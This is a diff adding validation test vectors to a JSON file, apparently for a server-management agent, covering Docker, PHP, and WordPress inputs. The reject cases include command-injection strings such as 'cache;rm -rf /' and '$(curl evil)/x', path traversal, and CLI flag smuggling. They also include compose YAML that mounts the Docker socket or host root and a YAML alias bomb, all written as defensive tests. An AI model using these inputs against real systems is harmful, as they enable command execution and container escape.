@@ -1,6 +1,6 @@
 {
   "version": 1,
-  "total": 251,
+  "total": 324,
   "categories": {
     "domain": {
       "schema": "agent-ops/defs.schema.json#/$defs/Domain",
@@ -857,10 +857,52 @@
           "note": "Recipe Phase 5"
         },
         {
-          "input": "php8.1",
+          "input": "php7.4",
           "expect": "reject",
           "layer": "schema",
-          "note": "PHP ngoài kho Ubuntu (cần PPA, D-68)"
+          "note": "PHP ngoài catalog (Phase 10 chỉ thêm 8.1/8.2/8.4 qua PPA ghim, D-100)"
+        },
+        {
+          "input": "docker-ce",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Kho Docker Inc. không dùng (D-94)"
+        },
+        {
+          "input": "docker",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Recipe Phase 10 (docker.io + docker-compose-v2, D-94)"
+        },
+        {
+          "input": "wp-cli",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Recipe Phase 10 (phar ghim sha512, D-99)"
+        },
+        {
+          "input": "php8.4",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "PHP từ PPA ondrej/php khóa ghim (D-100)"
+        },
+        {
+          "input": "valkey",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Recipe Phase 10 (xung đột redis)"
+        },
+        {
+          "input": "php8.4 && curl evil",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn lệnh sau recipe hợp lệ"
+        },
+        {
+          "input": "ppa:ondrej/php",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Tên PPA tùy ý thay recipe"
         },
         {
           "input": "fail2ban",
@@ -1825,6 +1867,442 @@
           "expect": "reject",
           "layer": "schema",
           "note": "Khóa riêng không bao giờ được gửi tới agent"
+        }
+      ]
+    },
+    "compose_project_name": {
+      "schema": "agent-ops/defs.schema.json#/$defs/ComposeProjectName",
+      "vectors": [
+        {
+          "input": "cache",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Tên hợp lệ"
+        },
+        {
+          "input": "uptime-kuma_2",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Có gạch nối/gạch dưới"
+        },
+        {
+          "input": "Cache",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chữ hoa"
+        },
+        {
+          "input": "../etc",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Path traversal"
+        },
+        {
+          "input": "-cache",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Bắt đầu bằng gạch nối (giống cờ CLI)"
+        },
+        {
+          "input": "cache;rm -rf /",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn lệnh"
+        },
+        {
+          "input": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Dài hơn 63 ký tự"
+        },
+        {
+          "input": "cache app",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Khoảng trắng"
+        },
+        {
+          "input": "",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Rỗng"
+        }
+      ]
+    },
+    "docker_image_ref": {
+      "schema": "agent-ops/defs.schema.json#/$defs/DockerImageRef",
+      "vectors": [
+        {
+          "input": "nginx:1.27",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Image Docker Hub có tag"
+        },
+        {
+          "input": "redis:7.4-alpine",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Tag có gạch nối"
+        },
+        {
+          "input": "ghcr.io/itso/app:2.1.0",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Registry riêng"
+        },
+        {
+          "input": "registry.local:5000/team/app",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Registry có cổng"
+        },
+        {
+          "input": "nginx@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Ghim digest"
+        },
+        {
+          "input": "nginx:1.27 --privileged",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn cờ CLI"
+        },
+        {
+          "input": "nginx;id",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn lệnh"
+        },
+        {
+          "input": "NGINX",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Repo chữ hoa"
+        },
+        {
+          "input": "../../etc/passwd",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Path traversal"
+        },
+        {
+          "input": "-v/:/host",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Bắt đầu bằng gạch nối (giống cờ CLI)"
+        },
+        {
+          "input": "nginx:",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Tag rỗng"
+        },
+        {
+          "input": "nginx@sha256:abc",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Digest sai độ dài"
+        },
+        {
+          "input": "$(curl evil)/x",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Command substitution"
+        },
+        {
+          "input": "nginx\nprivileged: true",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Xuống dòng chèn YAML"
+        }
+      ]
+    },
+    "docker_volume_name": {
+      "schema": "agent-ops/defs.schema.json#/$defs/DockerVolumeName",
+      "vectors": [
+        {
+          "input": "cache_redis-data",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Volume do compose đặt tên"
+        },
+        {
+          "input": "old-test-data",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Hợp lệ"
+        },
+        {
+          "input": "/var/lib/docker",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Đường dẫn tuyệt đối (bind mount trá hình)"
+        },
+        {
+          "input": "../x",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Path traversal"
+        },
+        {
+          "input": "data..x",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chuỗi .."
+        },
+        {
+          "input": "-v",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Giống cờ CLI"
+        },
+        {
+          "input": "Data",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chữ hoa"
+        },
+        {
+          "input": "data name",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Khoảng trắng"
+        }
+      ]
+    },
+    "docker_network_name": {
+      "schema": "agent-ops/defs.schema.json#/$defs/DockerNetworkName",
+      "vectors": [
+        {
+          "input": "cache_default",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Network compose"
+        },
+        {
+          "input": "host",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Network hệ thống host"
+        },
+        {
+          "input": "bridge",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Network hệ thống bridge"
+        },
+        {
+          "input": "net;id",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn lệnh"
+        }
+      ]
+    },
+    "container_id": {
+      "schema": "agent-ops/defs.schema.json#/$defs/ContainerId",
+      "vectors": [
+        {
+          "input": "3f2a9c1b7d4e",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Id ngắn"
+        },
+        {
+          "input": "3f2a9c1b7d4e3f2a9c1b7d4e3f2a9c1b7d4e3f2a9c1b7d4e3f2a9c1b7d4eabcd",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Id đầy đủ 64 hex"
+        },
+        {
+          "input": "cache-redis-1",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Tên container thay cho id"
+        },
+        {
+          "input": "3f2a9c1b7d4e;id",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn lệnh"
+        },
+        {
+          "input": "../3f2a9c1b7d4e",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Path traversal"
+        }
+      ]
+    },
+    "compose_yaml": {
+      "schema": "agent-ops/defs.schema.json#/$defs/ComposeYaml",
+      "vectors": [
+        {
+          "input": "services:\n  app:\n    image: nginx:1.27\n    mem_limit: 256m\n",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "YAML hợp lệ"
+        },
+        {
+          "input": "services:\n  app:\n    image: nginx:1.27\n    privileged: true\n",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "privileged (chỉ SA ghi đè)"
+        },
+        {
+          "input": "services:\n  app:\n    image: nginx:1.27\n    network_mode: host\n",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "host network (không ghi đè)"
+        },
+        {
+          "input": "services:\n  app:\n    image: nginx:1.27\n    pid: host\n",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "host pid (không ghi đè)"
+        },
+        {
+          "input": "services:\n  app:\n    image: nginx:1.27\n    volumes:\n      - /:/host\n",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "bind / (không ghi đè)"
+        },
+        {
+          "input": "services:\n  app:\n    image: nginx:1.27\n    volumes:\n      - /etc:/etc\n",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "bind /etc"
+        },
+        {
+          "input": "services:\n  app:\n    image: nginx:1.27\n    volumes:\n      - /var/run/docker.sock:/var/run/docker.sock\n",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "docker socket"
+        },
+        {
+          "input": "services:\n  app:\n    image: nginx:1.27\n    cap_add: [SYS_ADMIN]\n",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "cap_add SYS_ADMIN"
+        },
+        {
+          "input": "services:\n  app:\n    image: nginx:1.27\n    security_opt: [\"seccomp:unconfined\"]\n",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "Tắt seccomp"
+        },
+        {
+          "input": "services:\n  app:\n    build: .\n",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "build từ context host"
+        },
+        {
+          "input": "services:\n  app:\n    image: nginx:1.27\n    ports:\n      - \"0.0.0.0:22:22\"\n",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "Publish cổng 22 ra mọi interface"
+        },
+        {
+          "input": "services:\n  app:\n    image: nginx:1.27\n    devices: [/dev/sda]\n",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "Thiết bị host"
+        },
+        {
+          "input": "x: &a [*a, *a]\nservices: *a\n",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "Alias YAML lồng (billion laughs)"
+        },
+        {
+          "input": "services:\n  app:\n    image: nginx:1.27\n\u0000",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Byte NUL"
+        }
+      ]
+    },
+    "wp_slug": {
+      "schema": "agent-ops/defs.schema.json#/$defs/WpSlug",
+      "vectors": [
+        {
+          "input": "wp-mail-smtp",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Slug plugin"
+        },
+        {
+          "input": "twentytwentyfour",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Slug theme"
+        },
+        {
+          "input": "../../wp-config",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Path traversal"
+        },
+        {
+          "input": "akismet --activate",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn cờ WP-CLI"
+        },
+        {
+          "input": "Akismet",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chữ hoa"
+        },
+        {
+          "input": "akismet;id",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Chèn lệnh"
+        },
+        {
+          "input": "-akismet",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Giống cờ CLI"
+        }
+      ]
+    },
+    "wp_path": {
+      "schema": "agent-ops/defs.schema.json#/$defs/RelPath",
+      "vectors": [
+        {
+          "input": "sites/anphat.vn/public",
+          "expect": "accept",
+          "layer": "schema",
+          "note": "Docroot trong home"
+        },
+        {
+          "input": "/var/www/html",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Đường dẫn tuyệt đối ngoài home"
+        },
+        {
+          "input": "../lehoa/sites/lehoa.vn/public",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Sang home account khác"
+        },
+        {
+          "input": "sites/anphat.vn/public/../../../../etc",
+          "expect": "reject",
+          "layer": "schema",
+          "note": "Traversal giữa chuỗi"
+        },
+        {
+          "input": "sites/link-ra-ngoai",
+          "expect": "reject",
+          "layer": "semantic",
+          "note": "Symlink trỏ ra ngoài home: agent kiểm sau khi resolve (path_outside_home)"
         }
       ]
     }
